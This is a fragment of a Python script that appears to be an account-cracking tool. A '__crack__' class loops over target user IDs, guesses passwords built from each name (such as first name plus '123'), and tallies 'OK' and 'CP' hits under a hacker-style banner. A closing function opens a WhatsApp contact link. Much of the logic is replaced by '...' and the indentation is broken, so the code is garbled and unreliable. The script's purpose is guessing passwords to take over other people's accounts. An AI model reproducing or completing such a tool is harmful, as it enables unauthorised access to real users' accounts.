...
class __crack__:
	...
	def __mbasic__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write('\r\033[1;32m[ IQRA 🔥] \033[1;97m%s/%s   \033[1;92m[ OK-:%s ]  \033[1;91m[ CP-:%s ] '%(loop,len(self.id),len(ok),len(cp))),
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
				...
				for yntkts in self.id:
					try:
						...
						if len(xz) == 1:
							...
							pwx = [first123, xz[0] + 'last123', xz[0] + 'First123', xz[0] + 'Last123']
						elif len(xz) == 3:
							pwx = [name, xz[0]+xz[1]]
						elif len(xz) == 4:
							pwx = [name, xz[0]+xz[1]]
...
def ff():
    ...
    a()
def dupcutter():
	os.system("xdg-open https://wa.me/03118066577")
	time.sleep(3)
	R()
